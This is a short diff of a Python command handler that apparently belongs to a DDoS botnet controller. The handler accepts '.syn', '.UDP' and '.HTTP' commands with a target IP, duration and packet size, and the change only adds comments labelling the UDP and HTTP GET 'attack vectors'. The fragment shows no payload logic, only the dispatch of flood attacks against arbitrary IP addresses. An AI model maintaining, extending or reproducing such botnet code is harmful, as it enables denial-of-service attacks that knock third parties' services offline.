@@ -156,6 +156,7 @@ def command_line(client):
                 else:
                     send(client, 'Usage: .syn [IP] [TIME]')
 
+            # UDP attack vector
             elif prefix == '.UDP':
                 if len(args) == 4:
                     ip = args[1]
@@ -175,6 +176,7 @@ def command_line(client):
                 else:
                     send(client, 'Usage: .udp [IP] [TIME] [SIZE]')
 
+            # HTTP GET attack vector
             elif prefix == '.HTTP':
                 if len(args) == 3:
                     ip = args[1]
